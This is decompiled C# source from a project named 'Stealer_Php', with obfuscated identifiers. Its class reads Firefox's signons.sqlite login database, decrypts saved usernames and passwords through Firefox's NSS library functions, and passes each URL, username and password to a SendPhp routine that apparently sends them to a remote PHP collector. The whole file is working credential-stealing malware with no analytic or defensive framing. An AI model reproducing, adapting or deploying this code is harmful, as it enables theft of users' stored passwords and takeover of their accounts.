using System;
using System.Collections;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic.CompilerServices;
using Stealer_Php.My;

namespace Stealer_Php;

[StandardModule]
internal sealed class firefox5
{
	public class SHITEMID
	{
		public static long cb;

		public static byte[] abID;
	}

	public struct TSECItem
	{
		public int SECItemType;

		public int SECItemData;

		public int SECItemLen;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate2();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

	public class SQLiteBase5
	{
		public enum SQLiteDataTypes
		{
			INT = 1,
			FLOAT,
			TEXT,
			BLOB,
			NULL
		}

		private const int int_0 = 0;

		private const int GMvmnLMX1OQ76Li4TvCBXSyKSALi4TvCBXSyKSAQ9mB9AujeaT4AkWFsAblkw8gA = 100;

		private const int kWFsAblkw8gz7VzdDkOWYl6FeAZJOIachY0JyYAZJOIachY0JyYAbQTegOPkDIb0 = 101;

		private IntPtr W6ZKpzFldVeU8W6ZKpzFldVeUAic32GnxZoUv6AnYjl5NQZm130AnYjl5NQZm13A;

		[DllImport("kernel32")]
		private static extern IntPtr HeapAlloc(IntPtr heap, uint flags, uint bytes);

		[DllImport("kernel32")]
		private static extern IntPtr GetProcessHeap();

		[DllImport("kernel32")]
		private static extern int lstrlen(IntPtr str);

		[DllImport("mozsqlite3")]
		private static extern int sqlite3_open(IntPtr fileName, ref IntPtr database);

		[DllImport("mozsqlite3")]
		private static extern int sqlite3_close(IntPtr database);

		[DllImport("mozsqlite3")]
		private static extern int sqlite3_exec(IntPtr database, IntPtr query, IntPtr callback, IntPtr arguments, ref IntPtr error);

		[DllImport("mozsqlite3")]
		private static extern IntPtr sqlite3_errmsg(IntPtr database);

		[DllImport("mozsqlite3")]
		private static extern int sqlite3_prepare_v2(IntPtr database, IntPtr query, int length, ref IntPtr statement, ref IntPtr tail);

		[DllImport("mozsqlite3")]
		private static extern int sqlite3_step(IntPtr statement);

		[DllImport("mozsqlite3")]
		private static extern int sqlite3_column_count(IntPtr statement);

		[DllImport("mozsqlite3")]
		private static extern IntPtr sqlite3_column_name(IntPtr statement, int columnNumber);

		[DllImport("mozsqlite3")]
		private static extern int sqlite3_column_type(IntPtr statement, int columnNumber);

		[DllImport("mozsqlite3")]
		private static extern int sqlite3_column_int(IntPtr statement, int columnNumber);

		[DllImport("mozsqlite3")]
		private static extern double sqlite3_column_double(IntPtr statement, int columnNumber);

		[DllImport("mozsqlite3")]
		private static extern IntPtr sqlite3_column_text(IntPtr statement, int columnNumber);

		[DllImport("mozsqlite3")]
		private static extern IntPtr sqlite3_column_blob(IntPtr statement, int columnNumber);

		[DllImport("mozsqlite3")]
		private static extern IntPtr sqlite3_column_table_name(IntPtr statement, int columnNumber);

		[DllImport("mozsqlite3")]
		private static extern int sqlite3_finalize(IntPtr handle);

		public SQLiteBase5()
		{
			W6ZKpzFldVeU8W6ZKpzFldVeUAic32GnxZoUv6AnYjl5NQZm130AnYjl5NQZm13A = IntPtr.Zero;
		}

		public SQLiteBase5(string baseName)
		{
			OpenDatabase(baseName);
		}

		public void OpenDatabase(string baseName)
		{
			if (sqlite3_open(OSchGepgtOQP2OSchGepgtOQPAlu60yRFUiMm2AhFm5q04U3ZTLAhFm5q04U3ZTA(baseName), ref W6ZKpzFldVeU8W6ZKpzFldVeUAic32GnxZoUv6AnYjl5NQZm130AnYjl5NQZm13A) != 0)
			{
				W6ZKpzFldVeU8W6ZKpzFldVeUAic32GnxZoUv6AnYjl5NQZm130AnYjl5NQZm13A = IntPtr.Zero;
			}
		}

		public void CloseDatabase()
		{
			if (W6ZKpzFldVeU8W6ZKpzFldVeUAic32GnxZoUv6AnYjl5NQZm130AnYjl5NQZm13A != IntPtr.Zero)
			{
				sqlite3_close(W6ZKpzFldVeU8W6ZKpzFldVeUAic32GnxZoUv6AnYjl5NQZm130AnYjl5NQZm13A);
			}
		}

		public ArrayList GetTables()
		{
			string query = "SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1";
			DataTable dataTable = ExecuteQuery(query);
			ArrayList arrayList = new ArrayList();
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = dataTable.Rows.GetEnumerator();
				while (enumerator.MoveNext())
				{
					DataRow dataRow = (DataRow)enumerator.Current;
					arrayList.Add(dataRow.ItemArray[0]!.ToString());
				}
				return arrayList;
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		public void ExecuteNonQuery(string query)
		{
			IntPtr error = default(IntPtr);
			sqlite3_exec(W6ZKpzFldVeU8W6ZKpzFldVeUAic32GnxZoUv6AnYjl5NQZm130AnYjl5NQZm13A, OSchGepgtOQP2OSchGepgtOQPAlu60yRFUiMm2AhFm5q04U3ZTLAhFm5q04U3ZTA(query), IntPtr.Zero, IntPtr.Zero, ref error);
			_ = error != IntPtr.Zero;
		}

		public DataTable ExecuteQuery(string query)
		{
			IntPtr statement = default(IntPtr);
			IntPtr tail = default(IntPtr);
			sqlite3_prepare_v2(W6ZKpzFldVeU8W6ZKpzFldVeUAic32GnxZoUv6AnYjl5NQZm130AnYjl5NQZm13A, OSchGepgtOQP2OSchGepgtOQPAlu60yRFUiMm2AhFm5q04U3ZTLAhFm5q04U3ZTA(query), TUuZNRnVjHbT4lKbtsDJhXs95ApHlbwR7iFTvOApHlbwR7iFTvOA27lJ2DrWT2WA(OSchGepgtOQP2OSchGepgtOQPAlu60yRFUiMm2AhFm5q04U3ZTLAhFm5q04U3ZTA(query)), ref statement, ref tail);
			DataTable fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA = new DataTable();
			for (int num = Q3s6KGjSWIyT0r07o9rtSts9MAr07o9rtSts9MA5Vj8tfCesUe0A9pIElF1eV1WA(statement, ref fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA); num == 100; num = method_0(statement, ref fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA))
			{
			}
			sqlite3_finalize(statement);
			return fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA;
		}

		private int Q3s6KGjSWIyT0r07o9rtSts9MAr07o9rtSts9MA5Vj8tfCesUe0A9pIElF1eV1WA(IntPtr Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA, ref DataTable fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA)
		{
			fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA = new DataTable("resultTable");
			int num = sqlite3_step(Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA);
			checked
			{
				if (num == 100)
				{
					int num2 = sqlite3_column_count(Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA);
					string text = "";
					int num3 = 0;
					object[] array = new object[num2 - 1 + 1];
					int num4 = num2 - 1;
					for (int i = 0; i <= num4; i++)
					{
						text = YjHSPSogGYsL3c2u7a0ehg6FuAc2u7a0ehg6FuAYXRUXpdVrjYZATUuZNRnVjHb0(sqlite3_column_name(Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA, i));
						switch (sqlite3_column_type(Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA, i))
						{
						default:
							fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA.Columns.Add(text, Type.GetType("System.String"));
							array[i] = "";
							break;
						case 1:
							fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA.Columns.Add(text, Type.GetType("System.Int32"));
							array[i] = sqlite3_column_int(Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA, i);
							break;
						case 2:
							fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA.Columns.Add(text, Type.GetType("System.Single"));
							array[i] = sqlite3_column_double(Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA, i);
							break;
						case 3:
							fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA.Columns.Add(text, Type.GetType("System.String"));
							array[i] = YjHSPSogGYsL3c2u7a0ehg6FuAc2u7a0ehg6FuAYXRUXpdVrjYZATUuZNRnVjHb0(sqlite3_column_text(Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA, i));
							break;
						case 4:
							fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA.Columns.Add(text, Type.GetType("System.String"));
							array[i] = YjHSPSogGYsL3c2u7a0ehg6FuAc2u7a0ehg6FuAYXRUXpdVrjYZATUuZNRnVjHb0(sqlite3_column_blob(Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA, i));
							break;
						}
					}
					fOp4vuYMxCqO1bLB8uWNMdmAhAbLB8uWNMdmAhAdCgW0IsZPMQKAi8LBWWwZLwLA.Rows.Add(array);
				}
				return sqlite3_step(Q6WJc6sL9RwC0Q6WJc6sL9RwCAPbz2VXLYM0WqAUY0kK6YYmci7AUY0kK6YYmciA);
			}
		}

		private int method_0(IntPtr i8LBWWwZLwLF0SAXYbI1NZYTtAAxVcStVNw6hBAAxVcStVNw6hBAqRAxoicap5FA, ref DataTable umf0yHRaRHxk1umf0yHRaRHxkA8E9N64pO7GbNADao2PIzOYTdHADao2PIzOYTdA)
		{
			int num = sqlite3_column_count(i8LBWWwZLwLF0SAXYbI1NZYTtAAxVcStVNw6hBAAxVcStVNw6hBAqRAxoicap5FA);
			int num2 = 0;
			checked
			{
				object[] array = new object[num - 1 + 1];
				int num3 = num - 1;
				for (int i = 0; i <= num3; i++)
				{
					switch (sqlite3_column_type(i8LBWWwZLwLF0SAXYbI1NZYTtAAxVcStVNw6hBAAxVcStVNw6hBAqRAxoicap5FA, i))
					{
					default:
						array[i] = "";
						break;
					case 1:
						array[i] = sqlite3_column_int(i8LBWWwZLwLF0SAXYbI1NZYTtAAxVcStVNw6hBAAxVcStVNw6hBAqRAxoicap5FA, i);
						break;
					case 2:
						array[i] = sqlite3_column_double(i8LBWWwZLwLF0SAXYbI1NZYTtAAxVcStVNw6hBAAxVcStVNw6hBAqRAxoicap5FA, i);
						break;
					case 3:
						array[i] = YjHSPSogGYsL3c2u7a0ehg6FuAc2u7a0ehg6FuAYXRUXpdVrjYZATUuZNRnVjHb0(sqlite3_column_text(i8LBWWwZLwLF0SAXYbI1NZYTtAAxVcStVNw6hBAAxVcStVNw6hBAqRAxoicap5FA, i));
						break;
					case 4:
						array[i] = YjHSPSogGYsL3c2u7a0ehg6FuAc2u7a0ehg6FuAYXRUXpdVrjYZATUuZNRnVjHb0(sqlite3_column_blob(i8LBWWwZLwLF0SAXYbI1NZYTtAAxVcStVNw6hBAAxVcStVNw6hBAqRAxoicap5FA, i));
						break;
					}
				}
				umf0yHRaRHxk1umf0yHRaRHxkA8E9N64pO7GbNADao2PIzOYTdHADao2PIzOYTdA.Rows.Add(array);
				return sqlite3_step(i8LBWWwZLwLF0SAXYbI1NZYTtAAxVcStVNw6hBAAxVcStVNw6hBAqRAxoicap5FA);
			}
		}

		private IntPtr OSchGepgtOQP2OSchGepgtOQPAlu60yRFUiMm2AhFm5q04U3ZTLAhFm5q04U3ZTA(string v1KPi45bkSvv0qNxUYhSbq04DAqNxUYhSbq04DAMqUpjUfPfcjUASBrWs3VP6BRA)
		{
			if (v1KPi45bkSvv0qNxUYhSbq04DAqNxUYhSbq04DAMqUpjUfPfcjUASBrWs3VP6BRA == null)
			{
				return IntPtr.Zero;
			}
			Encoding uTF = Encoding.UTF8;
			byte[] bytes = uTF.GetBytes(v1KPi45bkSvv0qNxUYhSbq04DAqNxUYhSbq04DAMqUpjUfPfcjUASBrWs3VP6BRA);
			uint bytes2 = checked((uint)(bytes.Length + 1));
			IntPtr intPtr = HeapAlloc(GetProcessHeap(), 0u, bytes2);
			Marshal.Copy(bytes, 0, intPtr, bytes.Length);
			Marshal.WriteByte(intPtr, bytes.Length, 0);
			return intPtr;
		}

		private string YjHSPSogGYsL3c2u7a0ehg6FuAc2u7a0ehg6FuAYXRUXpdVrjYZATUuZNRnVjHb0(IntPtr SBrWs3VP6BRn0ifeFDUncJnLRAeciv33wcjMmKAeciv33wcjMmKAbTQHQr8RuxKA)
		{
			if (SBrWs3VP6BRn0ifeFDUncJnLRAeciv33wcjMmKAeciv33wcjMmKAbTQHQr8RuxKA == IntPtr.Zero)
			{
				return null;
			}
			Encoding uTF = Encoding.UTF8;
			int num = TUuZNRnVjHbT4lKbtsDJhXs95ApHlbwR7iFTvOApHlbwR7iFTvOA27lJ2DrWT2WA(SBrWs3VP6BRn0ifeFDUncJnLRAeciv33wcjMmKAeciv33wcjMmKAbTQHQr8RuxKA);
			byte[] array = new byte[checked(num - 1 + 1)];
			Marshal.Copy(SBrWs3VP6BRn0ifeFDUncJnLRAeciv33wcjMmKAeciv33wcjMmKAbTQHQr8RuxKA, array, 0, num);
			return uTF.GetString(array, 0, num);
		}

		private int TUuZNRnVjHbT4lKbtsDJhXs95ApHlbwR7iFTvOApHlbwR7iFTvOA27lJ2DrWT2WA(IntPtr fPZMeTORgXsG0fPZMeTORgXsGAVGwidGidU6gXAPDOOmTYdIiYoAPDOOmTYdIiYA)
		{
			if (fPZMeTORgXsG0fPZMeTORgXsGAVGwidGidU6gXAPDOOmTYdIiYoAPDOOmTYdIiYA == IntPtr.Zero)
			{
				return 0;
			}
			return lstrlen(fPZMeTORgXsG0fPZMeTORgXsGAVGwidGidU6gXAPDOOmTYdIiYoAPDOOmTYdIiYA);
		}
	}

	private static IntPtr APE4p9Tlaejh93Lr9hNdmCDPbA3Lr9hNdmCDPbAvDNWa9TaOoNEAz8xCkmIaQOl0;

	public static string signon;

	public static string GetFire()
	{
		checked
		{
			string result3 = default(string);
			try
			{
				bool flag = false;
				long num = 0L;
				_ = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
				string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
				string[] directories = Directory.GetDirectories(path);
				string[] array = directories;
				foreach (string text in array)
				{
					if (flag)
					{
						break;
					}
					string[] files = Directory.GetFiles(text);
					string[] array2 = files;
					foreach (string input in array2)
					{
						if (flag)
						{
							break;
						}
						if (Regex.IsMatch(input, "signons.sqlite"))
						{
							NSS_Init(text);
							signon = input;
						}
					}
				}
				string baseName = signon;
				TSECItem tSECItem = default(TSECItem);
				TSECItem result = default(TSECItem);
				TSECItem result2 = default(TSECItem);
				SQLiteBase5 sQLiteBase = new SQLiteBase5(baseName);
				DataTable dataTable = sQLiteBase.ExecuteQuery("SELECT * FROM moz_logins;");
				DataTable dataTable2 = sQLiteBase.ExecuteQuery("SELECT * FROM moz_disabledHosts;");
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = dataTable2.Rows.GetEnumerator();
					while (enumerator.MoveNext())
					{
						_ = (DataRow)enumerator.Current;
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				num = PK11_GetInternalKeySlot();
				PK11_Authenticate(num, loadCerts: true, 0L);
				IEnumerator enumerator2 = default(IEnumerator);
				try
				{
					enumerator2 = dataTable.Rows.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						DataRow dataRow = (DataRow)enumerator2.Current;
						string text2 = Convert.ToString(dataRow["formSubmitURL"].ToString());
						string text3 = text2;
						string text4 = "";
						string text5 = "";
						StringBuilder stringBuilder = new StringBuilder(dataRow["encryptedUsername"].ToString());
						int value = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
						IntPtr ptr = new IntPtr(value);
						TSECItem data = (TSECItem)Marshal.PtrToStructure(ptr, typeof(TSECItem));
						if (PK11SDR_Decrypt(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
						{
							byte[] array3 = new byte[result.SECItemLen - 1 + 1];
							ptr = new IntPtr(result.SECItemData);
							Marshal.Copy(ptr, array3, 0, result.SECItemLen);
							text4 = Encoding.UTF8.GetString(array3);
						}
						StringBuilder stringBuilder2 = new StringBuilder(dataRow["encryptedPassword"].ToString());
						int value2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
						ptr = new IntPtr(value2);
						TSECItem data2 = (TSECItem)Marshal.PtrToStructure(ptr, typeof(TSECItem));
						if (PK11SDR_Decrypt(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
						{
							byte[] array3 = new byte[result2.SECItemLen - 1 + 1];
							ptr = new IntPtr(result2.SECItemData);
							Marshal.Copy(ptr, array3, 0, result2.SECItemLen);
							text5 = Encoding.UTF8.GetString(array3);
						}
						p.OL = p.OL + "\r\nApplication: Mozilla Firefox\r\nUrl: " + text3 + "\r\nUsername: " + text4 + "\r\nPassword: " + text5 + "\r\n\r\n";
						MyProject.Forms.Form1.SendPhp(Conversions.ToInteger("10"), text3, text4, text5);
					}
					return result3;
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result3;
			}
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public static long NSS_Init(string configdir)
	{
		string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		LoadLibrary(text + "mozutils.dll");
		LoadLibrary(text + "mozglue.dll");
		LoadLibrary(text + "mozcrt19.dll");
		LoadLibrary(text + "nspr4.dll");
		LoadLibrary(text + "plc4.dll");
		LoadLibrary(text + "plds4.dll");
		LoadLibrary(text + "ssutil3.dll");
		LoadLibrary(text + "mozsqlite3.dll");
		LoadLibrary(text + "nssutil3.dll");
		LoadLibrary(text + "softokn3.dll");
		APE4p9Tlaejh93Lr9hNdmCDPbA3Lr9hNdmCDPbAvDNWa9TaOoNEAz8xCkmIaQOl0 = LoadLibrary(text + "nss3.dll");
		IntPtr procAddress = GetProcAddress(APE4p9Tlaejh93Lr9hNdmCDPbA3Lr9hNdmCDPbAvDNWa9TaOoNEAz8xCkmIaQOl0, "NSS_Init");
		DLLFunctionDelegate dLLFunctionDelegate = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate));
		return dLLFunctionDelegate(configdir);
	}

	public static long PK11_GetInternalKeySlot()
	{
		IntPtr procAddress = GetProcAddress(APE4p9Tlaejh93Lr9hNdmCDPbA3Lr9hNdmCDPbAvDNWa9TaOoNEAz8xCkmIaQOl0, "PK11_GetInternalKeySlot");
		DLLFunctionDelegate2 dLLFunctionDelegate = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate2));
		return dLLFunctionDelegate();
	}

	public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
	{
		IntPtr procAddress = GetProcAddress(APE4p9Tlaejh93Lr9hNdmCDPbA3Lr9hNdmCDPbAvDNWa9TaOoNEAz8xCkmIaQOl0, "PK11_Authenticate");
		DLLFunctionDelegate3 dLLFunctionDelegate = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate3));
		return dLLFunctionDelegate(slot, loadCerts, wincx);
	}

	public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		IntPtr procAddress = GetProcAddress(APE4p9Tlaejh93Lr9hNdmCDPbA3Lr9hNdmCDPbAvDNWa9TaOoNEAz8xCkmIaQOl0, "NSSBase64_DecodeBuffer");
		DLLFunctionDelegate4 dLLFunctionDelegate = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate4));
		return dLLFunctionDelegate(arenaOpt, outItemOpt, inStr, inLen);
	}

	public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
	{
		IntPtr procAddress = GetProcAddress(APE4p9Tlaejh93Lr9hNdmCDPbA3Lr9hNdmCDPbAvDNWa9TaOoNEAz8xCkmIaQOl0, "PK11SDR_Decrypt");
		DLLFunctionDelegate5 dLLFunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
		return dLLFunctionDelegate(ref data, ref result, cx);
	}
}
